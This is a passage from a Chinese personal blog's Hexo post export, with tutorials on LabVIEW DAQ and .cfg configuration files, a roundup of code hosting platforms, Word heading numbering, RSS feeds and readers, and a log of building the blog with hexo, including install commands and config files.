<li>存储 TDMS 文件时，默认会存储所有通道的数据，无法单独指定需要进行数据存储的通道；</li>
<li>若要采集编码器的计数值时，使用 <code>DAQ</code> 助手的配置界面无法返回整型的原始计数值。</li>
</ol>
<p>鉴于以上种种原因，在实际编程过程中，完全可以使用底层的 <code>DAQmx</code> 函数编写信号采集程序，或者在原有的 <code>DAQ</code> 助手程序基础上修改和简化。</p>
<h3 id="简化后程序"><a href="#简化后程序" class="headerlink" title="简化后程序"></a>简化后程序</h3><p>此处提供一个将上述代码简化并添加采样率可修改的程序。</p>
<p><img src="/assets/labview/daqAssistant/daqCustomsize.png" alt="DAQ助手简化改进版"></p>
<p>在该修改版中，去掉了大量的默认参数，减少了条件分支个数；添加了一个反馈节点，用以判断采样率的变化情况，在采样率改变时，该程序将删除原有任务，并重新创建新的任务。</p>
<h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a href="http://pan.baidu.com/s/1i50wss9" target="_blank" rel="noopener">http://pan.baidu.com/s/1i50wss9</a></p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
            <tag> tdms </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - 存储 .cfg 配置文件]]></title>
      <url>https://www.litreily.top/2017/03/25/labview-cfg/</url>
      <content type="html"><![CDATA[<h2 id="配置文件简介"><a href="#配置文件简介" class="headerlink" title="配置文件简介"></a>配置文件简介</h2><p>在 LabVIEW 应用软件开发过程中，对于稍微大型一点的软件而言，一般都需要在本地文件中保存一些配置参数，如在 windows 系统中安装软件时，安装程序在 C 盘 documents 文件夹下自动创建的用户数据。对于需要更新的配置参数或者重要的常值参数，在 LabVIEW 中可以使用 <code>.cfg</code> 格式的配置文件进行存储与读取。</p>
<h3 id="应用场合"><a href="#应用场合" class="headerlink" title="应用场合"></a>应用场合</h3><ul>
<li>软件的全局配置参数（如：串口通讯参数，DAQ 采样参数，信号处理参数，···）</li>
<li>软件主界面关闭前的输入、输出控件的最新数值</li>
<li>报表生成时的默认信息（如：署名，标题，摘要，···）</li>
<li>统计量（如：游戏最高分，排行榜排名，参与次数，···）</li>
<li>···</li>
</ul>
<h3 id="cfg-文件格式"><a href="#cfg-文件格式" class="headerlink" title=".cfg 文件格式"></a>.cfg 文件格式</h3><p>如下所示，<code>.cfg</code> 文件的数据存储格式格式满足标记性语言的特点，有点类似于 <code>JSON</code> 和 <code>XML</code>，但与之不同的是 <code>.cfg</code> 不支持数据嵌套。<code>.cfg</code> 文件以<strong>段</strong>为基本单位、以<strong>键</strong>为最小单位组织数据，<strong>段</strong>包含了相应的<strong>段名</strong>及该段包含的所有键，每个<strong>键</strong>包含了相应的<strong>键名</strong>和<strong>键值</strong>，中间用等号连接。</p>
<pre><code class="txt">[段名1]
键名1 = 键值1
键名2 = 键值2
键名3 = 键值3

[段名2]
键名4 = 键值4
键名5 = 键值5
键名6 = 键值6

[段名3]
键名7 = 键值7
键名8 = 键值8
</code></pre>
<p><strong>举例说明</strong>：某人要保存自己每日的就餐时间，此时可用一个<strong>段</strong>来存储，<strong>段名</strong>为“就餐时间”，三个<strong>键名</strong>依次为早餐、午餐和晚餐，具体的时间以字符串格式存储，存储后的结果如下：</p>
<pre><code class="txt">[就餐时间]
早餐 = 07:30
午餐 = 12:00
晚餐 = 05:30
</code></pre>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>LabVIEW 提供的与配置文件存取相关的函数支持以下6种数据类型，其中布尔型即开关量，仅包含 <code>TRUE</code>, <code>FALSE</code> 两个值；路径指的是文件或文件夹的路径。</p>
<ul>
<li>有符号整型： <code>I8</code>, <code>I16</code>, <code>I32</code></li>
<li>无符号整型： <code>U8</code>, <code>U16</code>, <code>U32</code></li>
<li>浮点型： <code>DBL</code>, <code>SGL</code></li>
<li>布尔型： <code>BOOL</code></li>
<li>字符串： <code>STRING</code></li>
<li>路径： <code>PATH</code></li>
</ul>
<h3 id="变体"><a href="#变体" class="headerlink" title="变体"></a>变体</h3><p>LabVIEW 提供了一种特殊的数据类型——变体，变体类似于 C 语言中的空类型指针 <code>void*</code>，不代表具体的类型，但可以存储任意类型的数据。</p>
<p>在存储配置文件时，可以先将满足 <a href="#1-3-数据类型">1.3</a> 中类型的数据转换为变体数据，然后以变体数组形式存储，方便统一管理；同样，在读取配置文件时，也可以先将数据读取到变体数组中，后续再进一步解析。具体操作步骤后面会有详述。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>了解了配置文件的格式及数据类型，下面介绍如何在 LabVIEW 实现配置文件的存取。</p>
<h3 id="配置函数"><a href="#配置函数" class="headerlink" title="配置函数"></a>配置函数</h3><p>LabVIEW 提供了以下函数供开发人员使用：</p>
<p><img src="/assets/labview/rwCFG/ConfigFunc.png" alt="ConfigFunc.vi"></p>
<p>但应用较多的与配置文件存取相关的函数主要有：</p>
<ol>
<li>打开配置数据</li>
<li>关闭配置数据</li>
<li>转换至变体</li>
<li>从变体转换至数据</li>
<li>写入键</li>
<li>读取键</li>
</ol>
<h4 id="打开配置数据"><a href="#打开配置数据" class="headerlink" title="打开配置数据"></a>打开配置数据</h4><p><img src="/assets/labview/rwCFG/OpenConfigData.png" alt="OpenConfigData.vi"></p>
<p><code>Open Config Data.vi</code> 用于打开配置文件，如果文件不存在则先创建再打开，返回引用句柄用于后续的数据存取。</p>
<h4 id="关闭配置数据"><a href="#关闭配置数据" class="headerlink" title="关闭配置数据"></a>关闭配置数据</h4><p><img src="/assets/labview/rwCFG/CloseConfigData.png" alt="CloseConfigData.vi"></p>
<p>该函数与 <code>Open Config Data.vi</code> 成对出现，在对配置文件进行存取操作后，需要使用 <code>Close Config Data.vi</code> 关闭对配置文件的引用，释放配置文件占用的内存。</p>
<h4 id="转换至变体"><a href="#转换至变体" class="headerlink" title="转换至变体"></a>转换至变体</h4><p><img src="/assets/labview/rwCFG/ToVariant.png" alt="ToVariant.vi"></p>
<p><code>To Variant.vi</code> 可将任意数据类型的数据转换为变体数据。</p>
<h4 id="从变体转换至数据"><a href="#从变体转换至数据" class="headerlink" title="从变体转换至数据"></a>从变体转换至数据</h4><p><img src="/assets/labview/rwCFG/VariantToData.png" alt="VariantToData.vi"></p>
<p><code>Variant To Data.vi</code> 是 <code>To Variant.vi</code> 的逆过程，通过指定数据类型，可以将变体数据还原为转换为变体前的数据。</p>
<h4 id="写入键"><a href="#写入键" class="headerlink" title="写入键"></a>写入键</h4><p><img src="/assets/labview/rwCFG/WriteKey.png" alt="WriteKey.vi"></p>
<p>除错误簇外，<code>Write Key.vi</code> 包含4个输入：<strong>段</strong>对应字符串类型的<strong>段名</strong>，<strong>键</strong>对应字符串类型的<strong>键名</strong>，<strong>值</strong>对应任意数据类型的<strong>键值</strong>，<strong>引用句柄</strong>用于连接配置文件的引用句柄。说明：LabVIEW 中的引用句柄等同于 <code>C/C++</code> 语言中的引用，即变量的别名。</p>
<p>该函数根据输入参数将键名和键值保存到配置文件的指定段中，如果是首次创建指定的段，则自动在配置文件中添加新的段及键；如果段已存在键不存在，则仅添加键；如果段与键均已存在，则仅用新键值替换旧键值。</p>
<h4 id="读取键"><a href="#读取键" class="headerlink" title="读取键"></a>读取键</h4><p><img src="/assets/labview/rwCFG/ReadKey.png" alt="ReadKey.vi"></p>
<p>使用 <code>Read Key.vi</code> ，通过<strong>段名</strong>和<strong>键名</strong>，我们可以从指定文件中获取所需的数据。</p>
<p>需要说明的是， <code>Read Key.vi</code> 是多态VI，其键值的数据类型是多态可选的，可选项参见 <a href="#1-3-数据类型">1.3</a>。</p>
<h3 id="存储配置文件"><a href="#存储配置文件" class="headerlink" title="存储配置文件"></a>存储配置文件</h3><p>说了一大堆，那到底如何存储呢，还是用程序框图来说话吧，一目了然。</p>
<ul>
<li><strong><code>RWConfigData.vi</code> 写操作</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/WriteToFile.png" alt="RWConfigData.vi Write Data"></p>
<p>该 VI 名为 <strong><code>RWConfigData.vi</code></strong> ，不涉及配置文件的打开与关闭，是配置文件打开以后的操作，文件的引用句柄为 <code>refnum in</code> 和 <code>refnum out</code> 。函数接口如下：</p>
<p><img src="/assets/labview/rwCFG/WriteToFileInterface.png" alt="RWConfigData.vi Interface"></p>
<p>插播一句，在 LabVIEW 中，许多函数的输入输出都是成对出现的，尤其是引用句柄和错误簇，这有点类似于 java 语言中用于返回当前对象的 this 指针，便于实现函数的链式调用，令代码更简洁，并增强代码的可读性。</p>
<p>言归正传，以上程序框图中，<code>CMD</code> 是个枚举变量，包含 <code>Write</code> 和 <code>Read</code> 两个值，分别对应文件的写操作和读操作；输入参数 <code>DataParam</code> 是一个簇，包含了需要存储的数据，簇包含的数据元素如下：</p>
<pre><code class="txt">SectionName : 段名（单个字符串）
KeyName : 键名（一维的字符串数组）
DataType : 数据类型（一维的枚举数组，枚举包含了文中提及的 6 种数据类型）
VariantData : 键值数据（一维的变体数组）
</code></pre>
<p>用变体数组的方式可以批量处理待存参数，高效便捷，唯一繁琐的一点就是需要先将待存参数均都转换为变体数据。上面的程序框图仅显示了布尔型数据的存储方式，其它类型的数据的存储方式与之相似，每种类型的数据对应一个条件分支。</p>
<p><img src="/assets/labview/rwCFG/WriteToFile1.png" alt="RWConfigData.vi Write Data"></p>
<ul>
<li><strong><code>RWSingleElement.vi</code> 写操作</strong></li>
</ul>
<p>对于单个参数的存储，同样可以使用该函数，结合配置文件的打开、关闭函数，具体代码实现如下：</p>
<p><img src="/assets/labview/rwCFG/WriteSingleData.png" alt="RWSingleElement.vi Write Data"></p>
<p>代码中的元素信息就是某个待存参数的相关信息，用到的存储子 VI 就是上面描述的 <strong><code>RWConfigData.vi</code></strong> 。该程序本身 <strong><code>RWSingleElement.vi</code></strong> 的函数接口如下：</p>
<p><img src="/assets/labview/rwCFG/WriteSingleDataInterface.png" alt="RWSingleElement.vi Interface"></p>
<h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><p>与存储相对应的操作是读取，上面提及的两个VI <strong><code>RWConfigData.vi</code></strong> 和 <strong><code>RWSingleElement.vi</code></strong> 对应的 <code>Read</code> 分支分别如下：</p>
<ul>
<li><strong><code>RWConfigData.vi</code> 读操作</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/ReadFromFile.png" alt="RWConfigData.vi Read Data"></p>
<ul>
<li><strong><code>RWSingleElement.vi</code> 读操作</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/ReadSingleData.png" alt="RWSingleElement.vi Read Data"></p>
<h2 id="配置文件存储例程"><a href="#配置文件存储例程" class="headerlink" title="配置文件存储例程"></a>配置文件存储例程</h2><p>下面给出一个非常简单的配置文件存取示例程序。</p>
<ul>
<li><strong>示例程序前面板</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/DemoFrontPanel.png" alt="RWConfigFileDemo.vi FrontPanel"></p>
<ul>
<li><strong>示例程序框图 写操作</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/DemoWriteData.png" alt="RWConfigFileDemo.vi Block diagram: Write"></p>
<ul>
<li><strong>示例程序框图 读操作</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/DemoReadData.png" alt="RWConfigFileDemo.vi Block diagram: Read"></p>
<ul>
<li><strong>示例程序 执行结果</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/DemoResultFile.png" alt="RWConfigFileDemo.vi Result File"></p>
<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="http://pan.baidu.com/s/1eRRVqRg" target="_blank" rel="noopener">http://pan.baidu.com/s/1eRRVqRg</a></p>
<p>PS：最后友情说明一下，其实文件扩展名不一定要设为 <code>.cfg</code> ，其它类似 <code>.ini</code> , <code>.sys</code> 等扩展名也都是可以的。</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常用的代码托管平台]]></title>
      <url>https://www.litreily.top/2017/03/23/code-Platform/</url>
      <content type="html"><![CDATA[<p>作为一名程序员，最不缺的就是代码，那自然得选择个好用的代码托管平台，本文将对常用的几个平台进行简要描述。</p>
<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p><img src="/assets/introduction/codePlatform/github.png" alt="github"></p>
<p>毋庸置疑，<a href="https://github.com/" target="_blank" rel="noopener">Github</a> 是全球应用最广的代码托管平台，兼社交平台，本博客便承载于 Github 的 pages 服务。但是使用 Github 保存私有项目是要收费的，所以我主要用其管理可公布于众的开源项目。</p>
<h2 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h2><p><img src="/assets/introduction/codePlatform/gitlab.png" alt="gitLab"></p>
<p><a href="https://gitlab.com/" target="_blank" rel="noopener">gitLab</a> 相比于 <code>Github</code> 具有更多的特性，官方点明的特性有：</p>
<ul>
<li>Unlimited repositories</li>
<li>Unlimited private collaborators</li>
<li>10GB disk space per project (including Git LFS)</li>
<li>Unlimited total disk space</li>
<li>Completely free, no credit card required</li>
<li>Unlimited CI Runners to do parallel testing</li>
<li>Alternate SSH port for git+ssh (443)</li>
</ul>
<h2 id="Visual-Studio-Team-Services-VSTS"><a href="#Visual-Studio-Team-Services-VSTS" class="headerlink" title="Visual Studio Team Services(VSTS)"></a>Visual Studio Team Services(VSTS)</h2><p><img src="/assets/introduction/codePlatform/VS-team-services.png" alt="VS Team Services"></p>
<p>微软提供的 <a href="https://www.visualstudio.com/team-services/" target="_blank" rel="noopener">Team Services</a> 也是相当出色的团队协作服务平台，为开发人员或团队协助开发提供线上服务，提供了项目管理、版本控制、自动建置、自动测试、部署发行管理等功能，并且支持各种语言、开发平台或是 IDE 工具等，五人以下团队可免费使用。</p>
<p>微软的亲儿子 <a href="https://www.visualstudio.com/" target="_blank" rel="noopener">Visual Studio</a> 现已更新至 2017 版，从早期版本便已集成了 <code>VSTS</code> 工具，在 <code>VS</code> 中，配合 <code>git</code> 或 Team Foundation Version Control (<code>TFVC</code>) 版本控制系统，从团队资源管理器可以方便上传代码至 <code>VSTS</code> 服务器，还可以从 <code>Github</code> 等其它平台进行项目克隆。我通常在使用 <code>VS</code> 进行软件开发时可用它来管理代码。</p>
<p><img src="/assets/introduction/codePlatform/VSTS.png" alt="VSTS"></p>
<h2 id="Bitbucket"><a href="#Bitbucket" class="headerlink" title="Bitbucket"></a>Bitbucket</h2><p><img src="/assets/introduction/codePlatform/bitbucket.png" alt="Bitbucket"></p>
<p><a href="https://bitbucket.org/" target="_blank" rel="noopener">Bitbucket</a> 是一个源代码托管网站，采用 Mercurial 和 git 作为版本控制系统，对于小等于5人的小团队提供免费托管服务，算是非常不错的 <code>Github</code> 替代品。</p>
<h2 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h2><p><img src="/assets/introduction/codePlatform/coding.png" alt="coding"></p>
<p><a href="https://coding.net/" target="_blank" rel="noopener">Coding</a> 官方介绍：</p>
<blockquote>
<p>CODING 是国内首个一站式云端软件服务平台，于 2014 年 2 月在深圳成立，并于北京、上海、成都、西雅图设立分部。在云计算时代，CODING 致力于通过技术创新推动软件开发与交付模式的转变，让开发更简单。</p>
</blockquote>
<p>coding 是国内少有的做得非常棒的代码托管平台之一，于 2016 年 3 月 2 日收购了 2011 年成立的 <a href="https://coding.net/gitcafe.html" target="_blank" rel="noopener">GitCafe</a>，能够免费存储私有项目和开源项目，包含有趣的社交平台 “冒泡”，大型的众包平台 “码市”，同样支持 pages 服务，我主要用其管理私有项目。</p>
<h2 id="华为-DevCloud"><a href="#华为-DevCloud" class="headerlink" title="华为 DevCloud"></a>华为 DevCloud</h2><p><img src="/assets/introduction/codePlatform/devCloud.png" alt="DevCloud"></p>
<p><code>2017.3.22</code>参加了华为在青岛香格里拉酒店举办的软件开发云大会，又了解了一款企业级的集华为研发实践、前沿研发理念、先进研发工具为一体的研发云平台 <a href="http://www.hwclouds.com/devcloud/" target="_blank" rel="noopener">DevCloud</a> ，面向开发者提供研发工具服务，让软件开发简单高效，对国内开发者而言绝对是一大福音了。同样，该平台功能强大，自然也少不了基础的代码托管功能。</p>
<p><img src="/assets/introduction/codePlatform/devCloudFuncs.png" alt="DevCloudFuntions"></p>
<h2 id="码云"><a href="#码云" class="headerlink" title="码云"></a>码云</h2><p><img src="/assets/introduction/codePlatform/codeCloud.png" alt="codeCloud"></p>
<p><a href="http://git.oschina.net/" target="_blank" rel="noopener">码云</a> 依托于国内知名网站 <a href="https://www.oschina.net/" target="_blank" rel="noopener">开源中国</a>，界面与 <code>Github</code> 非常相像，可免费托管私有、开源项目。</p>
<h2 id="CSDN"><a href="#CSDN" class="headerlink" title="CSDN"></a>CSDN</h2><p><img src="/assets/introduction/codePlatform/csdnCode.png" alt="csdnCode"></p>
<p><a href="http://bbs.csdn.net/" target="_blank" rel="noopener">CSDN</a> 号称全球最大中文IT社区，社区内的 <a href="https://code.csdn.net/" target="_blank" rel="noopener">CODE</a> 模块为开发者提供了代码托管服务，每个项目的使用空间为<code>1GB</code>.</p>
<p>本人目前作为学生党，最常用的还是 <code>Github</code> 和 <code>Coding</code> ，平台再多，还是要选择最合适自己的嘛。</p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
            <tag> VS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Word排版 - 章节编号]]></title>
      <url>https://www.litreily.top/2016/12/28/word-numbering/</url>
      <content type="html"><![CDATA[<p>在论文攥写过程中，少不了对文档进行排版，而对章节名称进行编号就是排版中的一环，本文将以Word2016为例进行说明。</p>
<h2 id="添加标题并设置标题样式"><a href="#添加标题并设置标题样式" class="headerlink" title="添加标题并设置标题样式"></a>添加标题并设置标题样式</h2><p>在word文档中添加好标题，然后对各个标题按层级顺序设置好对应的标题样式。</p>
<p><img src="/assets/word/numbering/addTitle.png" alt="addTitle"></p>
<h2 id="选择默认的多级列表样式"><a href="#选择默认的多级列表样式" class="headerlink" title="选择默认的多级列表样式"></a>选择默认的多级列表样式</h2><p>在菜单栏的“开始”选项卡中选择如下所示的多级列表，单击选中后点击底部的“定义新的多级列表”</p>
<p><img src="/assets/word/numbering/selectType.png" alt="selectType"></p>
<h2 id="定义新的多级列表"><a href="#定义新的多级列表" class="headerlink" title="定义新的多级列表"></a>定义新的多级列表</h2><p>在弹出的设置界面中点击“更多”，然后依次设置三层标题样式</p>
<h3 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h3><p>在编号格式中添加前缀和后缀，在后面添加两个空格，取消制表符，并将文本缩进位置设为0厘米，最后将该样式链接到 “标题1”。</p>
<p><img src="/assets/word/numbering/type1.png" alt="type1"></p>
<h3 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h3><p>与一级标题不同的是，二级标题需要勾选右下方的 “正规形式编号”。</p>
<p><img src="/assets/word/numbering/type2.png" alt="type2"></p>
<h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p>三级标题和二级标题的样式类似，照着来一遍就行。</p>
<p><img src="/assets/word/numbering/type3.png" alt="type3"></p>
<h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p>点击确定以后，便可以看到所有标题都已经按给定格式添加好了编号。</p>
<p><img src="/assets/word/numbering/effect.png" alt="effect"></p>
<p>Notes：</p>
<ol>
<li>由于有的一级标题可能不需要编号，如<strong>参考文献</strong>，所以可以在设计多级列表时把右上角的 “将级别链接到样式” 选为 “(无样式)”，设置好后。对于需要编号的一级标题，可以手动选择标题后选择该多级列表样式。</li>
<li>注意千万不要在设置编号的时候把默认的数字1删掉，即使自己后来再重新写上也不行，因为默认给定的数字都具有自动编号功能，自己手动加上的将视为固定字符而无法完成自动编号。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 杂物柜 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> office </tag>
            
            <tag> word </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RSS简介]]></title>
      <url>https://www.litreily.top/2016/12/26/RSS-descr/</url>
      <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>之前看到好多网站都有下面这个图标，然后点进去就出来个<code>xml</code>文件，一直不明白这个是干什么的，后来自己使用<code>jekyll</code>创建博客，发现自动生成了一个<code>feed.xml</code>，也不明白这是干啥的。</p>
<p><img src="/assets/rss/rss.jpg" alt="RSS logo"></p>
<p>直到近日使用<code>Hexo</code>创建博客，又遇到<code>RSS</code>配置问题，这才决定一探究竟。经过搜索，知道 <code>RSS</code> (Really Simple Syndication, 简易信息聚合)是一种基于<code>XML</code>标准，广泛用于互联网的内容包装和投递协议。</p>
<p>而前面所说的<code>feed.xml</code>就是一个<code>RSS</code>文件，当我们把rss文件通过链接形式放在自己的博客网站上后，其他人就能通过这个链接订阅自己的博客了。</p>
<p>在这个信息爆炸的时代，使用RSS订阅能更快速地获取自己想要关注的信息，避免浪费大量时间在网络上漫无目的的瞎逛。</p>
<h2 id="RSS源"><a href="#RSS源" class="headerlink" title="RSS源"></a>RSS源</h2><p>了解了什么是<code>rss</code>后，我们需要知道的就是如果获取RSS资源，现在的大部分新闻网站和博客网站都提供了RSS订阅功能。如何分辨一个网站是否支持RSS订阅功能，目前我所知道的方法包括：</p>
<ol>
<li>查找网站中的 RSS logo</li>
<li>标注了 “RSS” 文字的地方</li>
<li>标注了 “订阅” 相关的链接</li>
</ol>
<p>嫌麻烦，当然可以找别人已经总结好的订阅源：</p>
<ol>
<li><a href="https://www.zhihu.com/question/19580096" target="_blank" rel="noopener">知乎-你必读的 RSS 订阅源有哪些？</a></li>
<li><a href="https://www.zhihu.com/question/19564031" target="_blank" rel="noopener">哪些 RSS 值得订阅到阅读器？</a></li>
<li>本站点博客：<a href="http://www.litreily.top/atom.xml">http://www.litreily.top/atom.xml</a></li>
<li>本人的Lofter博客：<a href="http://litreily.lofter.com/rss" target="_blank" rel="noopener">http://litreily.lofter.com/rss</a></li>
</ol>
<p>下面这些是我目前订阅的一些资源：</p>
<ol>
<li>知乎日报：<a href="http://feeds.feedburner.com/zhihu-daily" target="_blank" rel="noopener">http://feeds.feedburner.com/zhihu-daily</a></li>
<li>知乎每日精选：<a href="https://www.zhihu.com/rss" target="_blank" rel="noopener">https://www.zhihu.com/rss</a></li>
<li>月光博客：<a href="http://feed.williamlong.info/" target="_blank" rel="noopener">http://feed.williamlong.info/</a></li>
<li>优设-UISDC：<a href="http://www.uisdc.com/feed" target="_blank" rel="noopener">http://www.uisdc.com/feed</a></li>
<li>异次元软件世界：<a href="http://feed.iplaysoft.com/" target="_blank" rel="noopener">http://feed.iplaysoft.com/</a></li>
<li>天涯小筑：<a href="http://tvfantasy.net/feed/" target="_blank" rel="noopener">http://tvfantasy.net/feed/</a></li>
<li>阮一峰的网络日志：<a href="http://www.ruanyifeng.com/blog/atom.xml" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/atom.xml</a></li>
<li>极客公园：<a href="http://www.geekpark.net/rss" target="_blank" rel="noopener">http://www.geekpark.net/rss</a></li>
<li>极客范：<a href="http://www.geekfan.net/feed/" target="_blank" rel="noopener">http://www.geekfan.net/feed/</a></li>
<li>互联网的那些事：<a href="http://www.alibuybuy.com/feed" target="_blank" rel="noopener">http://www.alibuybuy.com/feed</a></li>
</ol>
<h2 id="RSS阅读器"><a href="#RSS阅读器" class="headerlink" title="RSS阅读器"></a>RSS阅读器</h2><p>有了RSS资源，该用什么工具查看呢，这个通常分在线和离线两种。</p>
<ul>
<li><p>在线网站：<a href="http://reader.youdao.com/" target="_blank" rel="noopener">有道阅读</a>，<a href="http://www.yilan.io/" target="_blank" rel="noopener">一览</a> ...</p>
</li>
<li><p>离线软件：<a href="http://www.feeddemon.com/" target="_blank" rel="noopener">FeedDemon</a>，<a href="http://www.appinn.com/inoreader/" target="_blank" rel="noopener">inoreader</a> ...</p>
</li>
</ul>
<p>更详细的可以看这篇：<a href="https://www.zhihu.com/question/28808592" target="_blank" rel="noopener">2015 国内最好的 RSS 阅读器是什么？</a></p>
<h3 id="FeedDemon"><a href="#FeedDemon" class="headerlink" title="FeedDemon"></a>FeedDemon</h3><p>最后简单讲讲我现在用的离线软件 —— FeedDemon，用法极为简单，打开软件后使用快捷键 <code>Ctrl+N</code> 打开 <code>Subscrobe</code> 添加界面，输入rss文件链接后点击两次<code>next</code>即可。</p>
<p><img src="/assets/rss/feedDemon-addsite.png" alt="feedDemon-addSite"></p>
<p>下面这是我的订阅情况</p>
<p><img src="/assets/rss/feedDemon-sites.png" alt="feedDemon-sites"></p>
<p>Notes:</p>
<ol>
<li>如果当前页没有感兴趣的文章，可以使用快捷键 <code>Ctrl+D</code> 直接将整页设为“已读”，并自动跳至下一页或下一个订阅源。</li>
<li>该软件包含三种列表模式：标题、摘要和全文</li>
<li>该软件包含三种排序依据：订阅源、时间和标题</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RSS </tag>
            
            <tag> Feed </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[建站日志]]></title>
      <url>https://www.litreily.top/2016/12/12/blog-log/</url>
      <content type="html"><![CDATA[<p>使用 <code>hexo</code> 建站后，改用了新的主题，但存在许多问题，后续将不断修复更新，本文将记录主要的更新内容。</p>
<h2 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h2><p>在使用 <a href="https://github.com/yumemor/hexo-theme-primer" target="_blank" rel="noopener">primer</a> 主题之前，我使用 <code>jekyll</code> 建站，配合 <code>coding-pages</code> 服务部署网站，站点所有样式均为自定义。</p>
<h3 id="Infomation"><a href="#Infomation" class="headerlink" title="Infomation"></a>Infomation</h3><ul>
<li><code>jekyll</code> + <code>coding-pages</code> 建站</li>
<li><code>url</code>: <a href="http://www.litreily.top/">www.litreily.top</a></li>
<li>评论系统：<code>disqus</code> | 友言</li>
<li>统计服务：<a href="http://tongji.baidu.com/" target="_blank" rel="noopener">百度统计</a></li>
</ul>
<h3 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h3><p><img src="/assets/log/jekyll_home.png" alt="jekyll-homepage"></p>
<p><img src="/assets/log/jekyll_blog.png" alt="jekyll-blogpage"></p>
<p><img src="/assets/log/jekyll_category.png" alt="jekyll-category"></p>
<p><img src="/assets/log/jekyll_about.png" alt="jekyll-about"></p>
<h2 id="2016-12-11"><a href="#2016-12-11" class="headerlink" title="2016-12-11"></a>2016-12-11</h2><p>经好友 <a href="https://www.smslit.top/" target="_blank" rel="noopener">smslit</a> 推荐，使用 <code>hexo</code> 主题建站，纠结许久后决定使用 <code>primer</code> 主题，并根据个人需求进行定制和优化。好了，下面对建站过程进行简要介绍。</p>
<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><ul>
<li>安装 <code>hexo</code></li>
</ul>
<p>在确保安装好 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a> 以及 <a href="https://git-scm.com/downloads" target="_blank" rel="noopener">git</a> 的情况下执行以下指令</p>
<pre><code class="bash">npm install hexo-cli -g
hexo init hexoBlog
cd hexoBlog
npm install
</code></pre>
<p><code>hexo</code>系统默认下载主题 <a href="https://github.com/hexojs/hexo-theme-landscape" target="_blank" rel="noopener">landscape</a> ，折腾了一小会觉得除了代码高亮不错外，其它样式略显一般，所以直接放弃，改用 <a href="https://github.com/yumemor/hexo-theme-primer" target="_blank" rel="noopener">primer</a>。</p>
<ul>
<li>下载 <code>primer</code></li>
</ul>
<p>在 <code>hexoBlog\themes</code> 目录下克隆主题</p>
<pre><code class="bash">git clone https://github.com/yumemor/hexo-theme-primer.git
</code></pre>
<ul>
<li>新建 <code>github</code> 远程仓库</li>
</ul>
<p>为了使用 <code>github pages</code> ,需要将仓库名称设为 <code>[username].github.io</code> ，后续配置 <code>_config.yml</code> 时，需要将 <code>deploy</code> 的属性 <code>repo</code> 设为该仓库目录。</p>
<ul>
<li>安装插件</li>
</ul>
<p>为了使用 <code>hexo</code> 的发布功能、站内搜索等功能，需要安装以下插件</p>
<pre><code class="bash">npm install hexo-server --save
npm install hexo-renderer-less --save
npm install hexo-generator-feed --save
npm install hexo-generator-search --save
</code></pre>
<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><ul>
<li>修改 <strong>根目录</strong> 下的 <code>_config.yml</code></li>
</ul>
<pre><code class="YAML"># Site
title: LITREILY
subtitle: simple life
description: Stay Hungry, Stay Foolish
author: litreily
language: default
email: 707922098@qq.com

# URL
url: www.litreily.top/

# Writing
## transplant from jekyll system which post-name write  with date
## so it&#39;s needed to change the name of new posts
new_post_name: :year-:month-:day-:title.markdown

# Pagination
## Set per_page to 0 to disable pagination
per_page: 8
pagination_dir: page

# Extensions
## Plugins: https://hexo.io/plugins/
## Themes: https://hexo.io/themes/
theme: primer

# Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
  type: git
  repo: git@github.com:Litreily/Litreily.github.io.git
  branch: master

# Search
search:
  path: search.xml
  field: post
</code></pre>
<ul>
<li>修改 <strong>主题目录</strong> 下的 <code>_config.yml</code></li>
</ul>
<pre><code class="YAML">menus:
    -
        name: 首页
        link: /
    -
        name: 分类
        link: categories/
    -
        name: 开源项目
        link: open-source/
    -
        name: 留言板
        link: message/

# Profile
profile:
    location: QingDao, China
    github: litreily
    organization: upc

# Github
github:
